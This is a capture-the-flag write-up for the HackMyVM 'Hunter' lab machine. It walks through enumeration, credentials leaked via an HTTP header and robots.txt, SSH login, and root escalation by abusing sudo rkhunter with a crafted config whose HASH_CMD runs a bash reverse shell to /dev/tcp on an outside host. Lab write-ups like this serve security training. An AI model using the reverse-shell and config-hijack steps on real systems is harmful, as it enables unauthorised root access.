# Hunter-HMV: [Hunter](https://hackmyvm.eu/machines/machine.php?vm=Hunter)

---

## Overview

This write-up documents the compromise of the **Hunter** machine from HackMyVM.

The attack path involves:
- Enumerating web service
- Leaking credentials via HTTP response headers
- Lateral movement between local users
- Privilege escalation through **misconfigured sudo access to rkhunter**, a root-executed security auditing tool

---

## Enumeration

Initial enumeration was performed using Nmap.

### Nmap Scan

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0
8080/tcp open  http    Golang net/http server
```

### Observations

- SSH is exposed on port **22**
- Go HTTP service is exposed on port **8080**
- `robots.txt` explicitly disallows `/admin`

---

## Web Enumeration (Port 8080)

Directory brute-forcing with **feroxbuster** revealed two interesting endpoints:

- `/admin`
- `/robots.txt`

Accessing `/admin` via GET or POST returns:

```
Invalid JWT.
```

However, performing a **POST request** reveals an additional response header:

```zsh
curl -i -X POST http://hunter.hmv:8080/admin
```

```
X-Secret-Creds: hunterman:thisisnitriilcisi
```

This indicates leaked credentials.

---

## Initial Access (hunterman)

Using the leaked credentials, SSH access is obtained:

```zsh
ssh hunterman@$ip
```

### User Flag

The user flag is located in the home directory:

```
/home/hunterman/user.txt
```

```
HMV{VcvaIKcezQVcvaIKcezQ}
```

---

## Local Enumeration

Listing home directories reveals another local user:

```
/home/huntergirl
```

Further inspection of the web root discloses additional credentials via `robots.txt`:

```
huntergirl:fickshitmichini
```

This allows switching to the `huntergirl` user.

---

## Privilege Escalation (huntergirl → root)

### Sudo Permissions

Running `sudo -l` as `huntergirl` reveals:

```
(root) NOPASSWD: /usr/local/bin/rkhunter
```

---

## rkhunter Abuse

`rkhunter` (Rootkit Hunter) is a security auditing tool designed to verify system integrity by hashing binaries and comparing them against known-good values.

Critically:
- rkhunter executes **external helper commands**
- The hashing backend can be defined via configuration (`HASH_CMD`)
- rkhunter is executed **as root** via sudo

This combination allows **arbitrary command execution as root** if configuration is attacker-controlled.

---

## Exploitation

By supplying a custom rkhunter configuration file and defining a user-controlled hashing command, arbitrary code execution occurs during a property database update (`--propupd`).

This results in a root shell.

```zsh
hunter:~$ sudo -l
Matching Defaults entries for huntergirl on hunter:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for huntergirl:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User huntergirl may run the following commands on hunter:
    (root) NOPASSWD: /usr/local/bin/rkhunter
hunter:~$ 

hunter:/tmp$ cat evil.conf 
INSTALLDIR=/usr/local
TMPDIR=/var/lib/rkhunter/tmp
DBDIR=/var/lib/rkhunter/db
SCRIPTDIR=/usr/local/lib/rkhunter/scripts
LOGFILE=/var/log/rkhunter.log
HASH_CMD=/tmp/rs.sh
hunter:/tmp$ cat rs.sh 
bash -c "/bin/bash -i >& /dev/tcp/192.168.56.1/1234 0>&1"
hunter:/tmp$ sudo /usr/local/bin/rkhunter --configfile /tmp/evil.conf --propupd
```

---

## Root Flag

With root access obtained, the root flag is located at:

```
/root/root.txt
```

```
HMV{FhOpuXDUlZFhOpuXDUlZ}
```

---

## Conclusion

This machine demonstrates several important security lessons:

- Sensitive data should never be leaked via HTTP headers
- Chained credentials significantly expand attack surface
- Security auditing tools are **extremely dangerous sudo targets**
- Root shells are often unnecessary — **logic flaws are enough**

---

## Attack Path Summary

```
Go Web App (port 8080)
        ↓
Credential leak via HTTP header
        ↓
SSH access as hunterman
        ↓
robots.txt credential disclosure
        ↓
Switch to huntergirl
        ↓
Misconfigured sudo (rkhunter)
        ↓
Root command execution
        ↓
Root flag
```
